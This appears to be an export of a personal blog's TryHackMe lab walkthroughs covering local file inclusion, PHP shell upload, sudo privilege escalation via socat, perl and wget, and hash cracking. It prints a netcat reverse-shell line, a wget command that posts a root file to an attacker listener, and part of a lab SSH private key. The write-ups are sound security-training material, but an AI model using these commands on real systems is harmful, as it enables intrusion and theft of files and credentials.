[{"content":"Intro A walkthrough of the room Inclusion from TryHackMe.\nLink to Room: https://tryhackme.com/room/inclusion\n Reconnaissance Scanning The first thing to do with an IP is perform an nmap scan to see the open ports and services running on the machine.\n└─$ nmap -sC -sV [ip] Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-26 20:07 BST Nmap scan report for [ip] Host is up (0.053s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA) | 256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA) |_ 256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519) 80/tcp open http Werkzeug httpd 0.16.0 (Python 3.6.9) |_http-server-header: Werkzeug/0.16.0 Python/3.6.9 |_http-title: My blog Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  So we have an SSH server on port 22 and a http server on port 80. Next step is to look at the webpage.\n Webpage The webpage looks like this:\nIt is obvious from the room name and the content of this homepage that we are going to exploit a local file inclusion.\nThis is where the name of the file presented to the user is taken from a parameter the user can control. Often this is a URL parameter so checking the links on this homepage we can find a possible exploit.\nHere on this homepage, we can find the link: [ip]/article?name=hacking by clicking on one of the \u0026ldquo;View Details\u0026rdquo; buttons. This looks to be vulnerable.\n Exploitation Local File Inclusion Simply changing the location of the file by the URL: [ip]/article?name=../../../../etc/passwd we get out the contents of the sensitive /etc/passwd file on the machine.\nOrganising this in a notepad, we find some credentials with the username, falconfeast:\n SSH Login We can use these credentials to login through SSH:\n└─$ ssh falconfeast@[ip] The authenticity of host '[ip]' can't be established. ECDSA key fingerprint is SHA256:VRi7CZbTMsqjwnWmH2UVPWrLVIZzG4BQ9J6X+tVsuEQ. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '[ip]' (ECDSA) to the list of known hosts. falconfeast@[ip]'s password: Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue Apr 27 00:41:29 IST 2021 System load: 0.17 Processes: 86 Usage of /: 34.8% of 9.78GB Users logged in: 0 Memory usage: 64% IP address for eth0: [ip] Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 3 packages can be updated. 3 updates are security updates. Last login: Thu Jan 23 18:41:39 2020 from 192.168.1.107 falconfeast@inclusion:~$   User Flag The user flag can then be found in the home directory and cat\u0026rsquo;d out:\nfalconfeast@inclusion:~$ ls articles user.txt falconfeast@inclusion:~$ cat user.txt 60989655[Redacted]   Privilege Escalation Sudo -l The first check for privilege escalation is the sudo permissions list. This gives us a list of commands we can run as root and leverage our position.\nfalconfeast@inclusion:~$ sudo -l Matching Defaults entries for falconfeast on inclusion: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User falconfeast may run the following commands on inclusion: (root) NOPASSWD: /usr/bin/socat   Socat Shell We can find out how to leverage this socat command by taking a look at GTFOBins. This listing is what we want to do:\n Root Flag Perfoming this exploit then allows us to create a root shell.\n Note: The GTFOBins listing says that this will not create a proper TTY shell so that is why there is no prompt.\n falconfeast@inclusion:~$ sudo socat stdin exec:/bin/sh whoami root cat /root/root.txt 4296410[Redacted]   ","permalink":"https://ascrivins.github.io/posts/tryhackme/inclusion/","summary":"Intro A walkthrough of the room Inclusion from TryHackMe.\nLink to Room: https://tryhackme.com/room/inclusion\n Reconnaissance Scanning The first thing to do with an IP is perform an nmap scan to see the open ports and services running on the machine.\n└─$ nmap -sC -sV [ip] Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-26 20:07 BST Nmap scan report for [ip] Host is up (0.053s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.","title":"[TryHackMe] Inclusion - Walkthrough"},{"content":"Intro Writeup of everything found and exploited in Lazy Admin.\nThe room information says: \u0026ldquo;Have some fun! There might be multiple ways to get user access.\u0026rdquo; So this is a writeup of everything I discovered.\nLink to room: https://tryhackme.com/room/lazyadmin\n Reconnaissance Scanning An nmap scan of the IP revealed the following information:\n└─$ nmap -sC -sV [ip] Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-25 14:51 BST Nmap scan report for [ip] Host is up (0.036s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA) | 256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA) |_ 256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  SSH port on 22 and a HTTP server on 80. -Standard stuff.\n Dirbuster The HTTP server on 80 gives the default Apache2 page:\nRunning a first round of dirbuster on this server gives the /content/ directory:\nThis gives a webpage for \u0026ldquo;SweetRice\u0026rdquo;:\nRunning a second round of dirbuster on this /content/ directory gives up some interesting pages to look at:\n First Credentials Found This dirbuster result gives an old SQL server file that we can download:\nTaking a look at the file, we find a username and an encrypted password:\nDropping this password into hashes.com allows us to easily decrypt:\n42f749ade7f9e195bf475f37a44cafcb:[Redacted]:MD5PLAIN   Webpage Admin Area The other interesting dirbuster result is /content/as/, this gives the login for the admin area.\nWe can login with the credentials found in the SQL database file and have a look around.\nOne interesting thing found here is this:\nThis tell us there is a database running mysql attached to the server on localhost and gives us the credentials, this might come in handy once the server has been compromised.\n Exploitation Shell Upload In the media centre we get an area we can upload files. There is some file extension checking here but we can get past with a .phtml file.\nWith a netcat port listening, we can simply click on the file and perform the exploit.\n└─$ nc -lvnp 1234 listening on [any] 1234 ... connect to [my-ip] from (UNKNOWN) [ip] 59624 Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux 17:16:39 up 26 min, 0 users, load average: 0.00, 0.02, 0.25 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $  We should first upgrade the shell using python:\n$ python -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' www-data@THM-Chal:/$   User Flag The user flag is then in the home directory of username: itguy\nwww-data@THM-Chal:/$ cd /home www-data@THM-Chal:/home$ ls itguy www-data@THM-Chal:/home$ cd itguy www-data@THM-Chal:/home/itguy$ ls Desktop Downloads Pictures Templates backup.pl mysql_login.txt Documents Music Public Videos examples.desktop user.txt   Internal Reconnaissance Database The database credentials are listed again within mysql_login.txt in itguy\u0026rsquo;s home directory. So my first though was to check this database for anything useful.\nwww-data@THM-Chal:/home/itguy$ mysql -u rice -p mysql -u rice -p Enter password: randompass Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 20 Server version: 5.7.28-0ubuntu0.16.04.2 (Ubuntu) Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. mysql\u0026gt; show Databases; show Databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | | website | +--------------------+ 5 rows in set (0.00 sec)  From looking around, there is nothing interesting here so this was a dead end.\n Sudo -l Checking the sudo privileges of www-data, we can see the commands that could be leveraged through privilege escalation:\nwww-data@THM-Chal:/home/itguy$ sudo -l Matching Defaults entries for www-data on THM-Chal: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on THM-Chal: (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl  This tells us we can run perl and a script within itguy\u0026rsquo;s home directory called backup.pl.\n Privilege Escalation backup.pl and copy.sh The backup script is going to run a file called copy.sh in the /etc/ folder:\nwww-data@THM-Chal:/home/itguy$ cat backup.pl #!/usr/bin/perl system(\u0026quot;sh\u0026quot;, \u0026quot;/etc/copy.sh\u0026quot;);  The permissions on this file mean we cannot edit but we can edit copy.sh:\nwww-data@THM-Chal:/home/itguy$ ls -al /etc | grep \u0026quot;copy.sh\u0026quot; -rw-r--rwx 1 root root 81 Nov 29 2019 copy.sh   Root Reverse Shell The contents of copy.sh gives us a reverse shell that just need updating with our IP and port.\nwww-data@THM-Chal:/home/itguy$ cat /etc/copy.sh rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 192.168.0.190 5554 \u0026gt;/tmp/f   Root Shell More simply we can just edit copy.sh to gives us a root shell like so:\nwww-data@THM-Chal:/home/itguy$ echo '/bin/sh -i' \u0026gt; /etc/copy.sh www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl # whoami root # python -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' root@THM-Chal:/home/itguy#  From here, we can read out the contents of the root flag.\nroot@THM-Chal:/# cd /root root@THM-Chal:~# ls root.txt root@THM-Chal:~# cat root.txt THM{6637f[Redacted]24699f}   Extra Notes Brute Forcing SSH Once I knew the username itguy, I did attempt to brute force his SSH password using hydra and rockyou.txt. However, this did not yield any results.\n ","permalink":"https://ascrivins.github.io/posts/tryhackme/lazyadmin/","summary":"Intro Writeup of everything found and exploited in Lazy Admin.\nThe room information says: \u0026ldquo;Have some fun! There might be multiple ways to get user access.\u0026rdquo; So this is a writeup of everything I discovered.\nLink to room: https://tryhackme.com/room/lazyadmin\n Reconnaissance Scanning An nmap scan of the IP revealed the following information:\n└─$ nmap -sC -sV [ip] Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-25 14:51 BST Nmap scan report for [ip] Host is up (0.","title":"[TryHackMe] LazyAdmin - Writeup"},{"content":"Intro Link to room: https://tryhackme.com/room/wgelctf\n User Flag nmap Scan First thing to always do is to run an nmap scan and check out the results.\n\u0026gt; nmap -sC -sV [ip] Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 09:13 EDT Nmap scan report for [ip] Host is up (0.039s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA) | 256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA) |_ 256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  So we have ports 22 and 80 open. So lets first check out the http server.\n Webpage We have the default Apache2 webpage.\nChecking the source code we can see a potential username:\n dirbuster We can now do a round of dirbuster to see any directories or files that we should look at. The results show a group of pages that follow /sitemap/\u0026hellip;\nChecking these pages out we see:\nWe should do a second round of dirbuster on this /sitemap/ directory to see if there is anything interesting. Dirbuster finds a url: /sitemap/.ssh/id_rsa - this is a key we can use to login through ssh.\n-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380 m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr +J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH ...   ssh Login We can copy \u0026amp; paste the key found into a file called key.txt. We then need to set the permissions of the file so that we can use it as a key. We can do this with:\nchmod 500 key.txt  Then supplying the key with the -i parameter and using the username \u0026ldquo;jessie\u0026rdquo; that was found in the source code, we can login through ssh:\n\u0026gt; ssh jessie@[ip] -i key.txt Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 8 packages can be updated. 8 updates are security updates. jessie@CorpOne:~$   Finding The Flag We a bit of traversal through the directories on the machine, we can find the file.\njessie@CorpOne:~$ ls Desktop Documents Downloads examples.desktop Music Pictures Public Templates Videos jessie@CorpOne:~$ cd Documents/ jessie@CorpOne:~/Documents$ ls user_flag.txt jessie@CorpOne:~/Documents$   Root Flag Sudo Permissions After gaining access to a system, the first thing to check in order to privilege escalate is the commands that we have sudo permissions for. This can be done with: sudo -l.\njessie@CorpOne:~/Documents$ sudo -l Matching Defaults entries for jessie on CorpOne: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User jessie may run the following commands on CorpOne: (ALL : ALL) ALL (root) NOPASSWD: /usr/bin/wget jessie@CorpOne:~/Documents$  From the results, we can see that we can run wget with sudo permissions so we should do some research on how to leverage this.\n GTFOBins on wget GTFOBins is a great site that lists the methods to leverage and perform privilege escalation. This is the listing for wget: https://gtfobins.github.io/gtfobins/wget/\nSo we can do a file upload of the root flag file to retrieve its contents.\n Performing The Exploit Firstly, we need to setup a listener for the file we are going to send. We can do this with netcat like so:\n\u0026gt; nc -lvnp 4445 listening on [any] 4445 ...  We are ready to retrieve the file on port 4445.\nFollowing the instructions from GTFOBins, we can set up the attack like this:\njessie@CorpOne:/$ URL=[my-ip]:4445 jessie@CorpOne:/$ LFILE=/root/root_flag.txt jessie@CorpOne:/$ sudo wget --post-file=$LFILE $URL  We get:\njessie@CorpOne:/$ sudo wget --post-file=$LFILE $URL --2021-04-18 16:49:15-- http://[my-ip]:4445/ Connecting to [my-ip]:4445... connected. HTTP request sent, awaiting response...  On our listening machine we have been sent the flag!\n\u0026gt; nc -lvnp 4445 listening on [any] 4445 ... connect to [my-ip] from (UNKNOWN) [ip] 53770 POST / HTTP/1.1 User-Agent: Wget/1.17.1 (linux-gnu) Accept: */* Accept-Encoding: identity Host: [my-ip]:4445 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Content-Length: 33 b1b968b...[Redacted] \u0026lt;-Flag.  ","permalink":"https://ascrivins.github.io/posts/tryhackme/wgel_ctf/","summary":"Intro Link to room: https://tryhackme.com/room/wgelctf\n User Flag nmap Scan First thing to always do is to run an nmap scan and check out the results.\n\u0026gt; nmap -sC -sV [ip] Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 09:13 EDT Nmap scan report for [ip] Host is up (0.039s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.","title":"[TryHackMe] Wgel CTF - Walkthrough"},{"content":"Intro Link to room: https://tryhackme.com/room/crackthehash\n Note: Some of the hashes will take a long time to crack.\n  Level 1 Hash 1: 48bb6e862e54f2a795ffc4e541caed4d This hash can be cracked by using a online tool to search through a database of cracked hashes.\n Head to: https://hashes.com/en/decrypt/hash Copy in the hash and press Submit. This gives us the result and algorithm:   48bb6e862e54f2a795ffc4e541caed4d:[Redacted]:MD5\n Hash 2: CBFDAC6008F9CAB4083784CBD\u0026hellip; This hash can be cracked by using a online tool to search through a database of cracked hashes.\n Head to: https://hashes.com/en/decrypt/hash Copy in the hash and press Submit. This gives us the result and algorithm:   cbfdac6008f9cab4083784cbd1874f76618d2a97:[Redacted]:SHA1\n Hash 3: 1C8BFE8F801D79745C4631D09F\u0026hellip; This hash can be cracked by using a online tool to search through a database of cracked hashes.\n Head to: https://hashes.com/en/decrypt/hash Copy in the hash and press Submit. This gives us the result and algorithm:   1c8bfe8f801d79745c4631d09fff36c82aa37fc4cce4fc946683d7b336b63032:[Redacted]:SHA256PLAIN\n Hash 4: $2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUz\u0026hellip; This is where it gets a little more tricky. Using the online tool doesn\u0026rsquo;t yield any results so we need to crack the hash.\nFirstly, we need to identify the algorithm. We can do this with the Hash Identifier tool on hashes.com.\nThis gives the result:\nPossible algorithms: bcrypt $2*$, Blowfish (Unix)  We can look up the hashcat mode for this algorithm here: https://hashcat.net/wiki/doku.php?id=example_hashes\nHashcat Mode #: 3200\nThen running this through Hashcat with the command:\nhashcat -a 3 -m 3200 blowfish.txt ?l?l?l?l  where:\n -a 3 is attack mode=3 which is brute force -m 3200 is the mode for Bycrpt Blowfish blowfish.txt is the file containing just the hash ?l?l?l?l specifies it\u0026rsquo;s a 4 letter word with char a-z  Gives result:\n$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom:[Redacted] Session..........: hashcat Status...........: Cracked Hash.Name........: bcrypt $2*$, Blowfish (Unix) Hash.Target......: $2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX...8wsRom Time.Started.....: Sat Apr 17 06:46:13 2021 (1 min, 35 secs) Time.Estimated...: Sat Apr 17 06:47:48 2021 (0 secs) Guess.Mask.......: bl?l?l [4] Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 6 H/s (9.64ms) @ Accel:2 Loops:64 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 604/676 (89.35%) Rejected.........: 0/604 (0.00%) Restore.Point....: 600/676 (88.76%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4032-4096 Candidates.#1....: bleh -\u0026gt; bllz   Hash 5: 279412f945939ba78ce0758d3fd83daa Here we can return to using a online tool to search through a database of cracked hashes.\n Head to: https://hashes.com/en/decrypt/hash Copy in the hash and press Submit. This gives us the result and algorithm:   279412f945939ba78ce0758d3fd83daa:[Redacted]:900\n Level 2 Hash 6: F09EDCB1FCEFC6DFB23DC3505A882\u0026hellip; This hash can be cracked by using a online tool to search through a database of cracked hashes.\n Head to: https://hashes.com/en/decrypt/hash Copy in the hash and press Submit. This gives us the result and algorithm:   f09edcb1fcefc6dfb23dc3505a882655ff77375ed8aa2d1c13f640fccc2d0c85:[Redacted]:SHA256PLAIN\n Hash 7: 1DFECA0C002AE40B8619ECF94\u0026hellip; This hash can be cracked by using a online tool to search through a database of cracked hashes.\n Head to: https://hashes.com/en/decrypt/hash Copy in the hash and press Submit. This gives us the result and algorithm:   1dfeca0c002ae40b8619ecf94819cc1b:[Redacted]:NTLM\n Hash 8: $6$aReallyHardSalt$6WKUTqzq.U\u0026hellip; Salt: aReallyHardSalt \u0026amp; Rounds: 5\nFirstly, we need to identify the algorithm. We can do this with the Hash Identifier tool on hashes.com.\nThis gives the result:\nPossible algorithms: sha512crypt $6$, SHA512 (Unix)  We can look up the hashcat mode for this algorithm here: https://hashcat.net/wiki/doku.php?id=example_hashes\nHashcat Mode #: 1800 - sha512crypt\nThen running this through Hashcat with the command:\nhashcat -m 1800 hash.hash wordlists/rockyou.txt  where:\n -m 1800 is the mode for sha512crypt hash.hash is the file containing just the hash wordlists/rockyou.txt is the dictionary to check against.  Gives result:\n$6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02.:[Redacted] Session..........: hashcat Status...........: Cracked Hash.Name........: sha512crypt $6$, SHA512 (Unix) Hash.Target......: $6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPM...ZAs02. Time.Started.....: Fri Apr 16 10:25:11 2021 (1 hour, 17 mins) Time.Estimated...: Fri Apr 16 11:42:52 2021 (0 secs) Guess.Base.......: File (wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 685 H/s (9.52ms) @ Accel:32 Loops:512 Thr:1 Vec:4 Recovered........: 1/1 (100.00%) Digests Progress.........: 2831936/14344385 (19.74%) Rejected.........: 0/2831936 (0.00%) Restore.Point....: 2831872/14344385 (19.74%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4608-5000 Candidates.#1....: wakaguma -\u0026gt; wak3Board   Hash 9: e5d8870e5bdd26602cab8dbe07a942\u0026hellip; Salt: tryhackme\nFirstly, we need to identify the algorithm. We can do this with the Hash Identifier tool:\nThis gives the result:\n HASH: e5d8870e5bdd26602cab8dbe07a942c8669e56d6 Possible Hashs: [+] SHA-1 [+] MySQL5 - SHA-1(SHA-1($pass))  The hint tells us the algorithm is HMAC-SHA1 so the identifier is not being helpful here. Hashcat Mode #: 160 - HMAC-SHA1\n Note: The mode is not 110 as the other walkthroughs say. ;)\n Then running this through Hashcat with the command:\nhashcat -m 160 sha1.txt wordlists/rockyou.txt  where:\n -m 160 is the mode for HMAC-SHA1 hash.hash is the file containing: hash:salt wordlists/rockyou.txt is the dictionary to check against.  Gives Result:\ne5d8870e5bdd26602cab8dbe07a942c8669e56d6:tryhackme:[Redacted] Session..........: hashcat Status...........: Cracked Hash.Name........: HMAC-SHA1 (key = $salt) Hash.Target......: e5d8870e5bdd26602cab8dbe07a942c8669e56d6:tryhackme Time.Started.....: Fri Apr 16 10:19:57 2021 (7 secs) Time.Estimated...: Fri Apr 16 10:20:04 2021 (0 secs) Guess.Base.......: File (wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 1570.3 kH/s (0.82ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 12314624/14344385 (85.85%) Rejected.........: 0/12314624 (0.00%) Restore.Point....: 12312576/14344385 (85.84%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: 48162450 -\u0026gt; 481101133 ","permalink":"https://ascrivins.github.io/posts/tryhackme/htm_crack_the_hash/","summary":"Intro Link to room: https://tryhackme.com/room/crackthehash\n Note: Some of the hashes will take a long time to crack.\n  Level 1 Hash 1: 48bb6e862e54f2a795ffc4e541caed4d This hash can be cracked by using a online tool to search through a database of cracked hashes.\n Head to: https://hashes.com/en/decrypt/hash Copy in the hash and press Submit. This gives us the result and algorithm:   48bb6e862e54f2a795ffc4e541caed4d:[Redacted]:MD5\n Hash 2: CBFDAC6008F9CAB4083784CBD\u0026hellip; This hash can be cracked by using a online tool to search through a database of cracked hashes.","title":"[TryHackMe] Crack the hash - Walkthrough"},{"content":"Blog created today to document some things that happen in my realm of Cybersecurity.\n","permalink":"https://ascrivins.github.io/posts/first_post/","summary":"Blog created today to document some things that happen in my realm of Cybersecurity.","title":"Hello World!"}]